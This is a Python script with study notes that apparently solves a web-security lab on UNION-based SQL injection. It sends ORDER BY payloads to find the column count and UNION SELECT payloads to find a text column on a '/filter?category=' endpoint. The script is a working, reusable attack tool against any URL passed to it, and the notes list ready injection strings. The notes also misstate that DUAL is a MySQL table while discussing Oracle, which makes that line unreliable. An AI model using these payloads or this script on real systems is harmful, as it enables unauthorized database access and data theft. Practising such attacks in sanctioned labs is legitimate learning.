"""
Notes 

In Oracle every SELECT query must use the FROM keyword and specify a valid table

Dual is a builtin table in mysql which contains the data for the dummy table which is used to select data without specifying a table name in the query

So the injected queries on Oracle would need to look like: 

' UNION SELECT NULL FROM DUAL--

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. 

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

If the column data type is not compatible with string data, the injected query will cause a database error, such as: 

Conversion failed when converting the varchar value 'a' to data type int.

"""
import requests
import sys
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  

def exploit_sqli_column_number(url):

    uri="/filter?category="
    for i in range(1,50):
        payload=f"' ORDER BY {i}--" 
        request=requests.get(url+uri+payload,verify=False)
        response=request.text
        if "Internal Server Error" in response:
            return i-1
        i=i+1
    return False

def exploit_sqli_string_field(url,num_cols):
    uri="/filter?category="
    for i in range(1,num_cols+1):
        str_palceholder="'j215My'"
        payload_list=['null']*num_cols
        payload_list[i-1]=str_palceholder
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + uri + sql_payload, verify=False)
        res = r.text
        if str_palceholder.strip('\'') in res:
            return i
    return False       

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")